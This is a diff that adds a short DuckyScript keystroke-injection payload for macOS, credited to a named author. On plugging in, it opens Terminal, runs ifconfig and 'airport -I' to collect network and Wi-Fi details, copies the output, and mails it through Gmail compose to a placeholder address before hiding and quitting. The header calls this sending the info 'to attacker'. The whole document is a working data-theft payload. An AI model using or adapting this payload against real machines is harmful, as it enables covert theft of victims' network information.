@@ -1,0 +1,48 @@
+REM Author: Jon Edwards
+REM Description: This payload opens a terminal, gets ip address and 'airport -I' info and automatically sends info to attacker. 
+REM -------------------------------- 
+DELAY 3000
+GUI SPACE
+DELAY 1500
+STRING terminal
+DELAY 1500
+ENTER
+DELAY 3000
+STRING clear
+DELAY 1500
+ENTER
+DELAY 1000
+STRING ifconfig
+ENTER
+DELAY 1500
+STRING airport -I
+DELAY 1500
+ENTER
+DELAY 1500
+GUI a
+DELAY 1000
+GUI c
+ENTER
+DELAY 3000
+STRING open https://mail.google.com/mail/u/0/#inbox?compose=new
+ENTER
+DELAY 20000
+STRING example@gmail.com
+DELAY 2000
+TAB
+DELAY 1500
+TAB
+DELAY 1500
+STRING ***example email title***
+DELAY 1500
+TAB
+DELAY 1500
+GUI v
+DELAY 1500
+TAB
+DELAY 1000
+ENTER
+DELAY 9000
+GUI h
+DELAY 1000
+GUI q
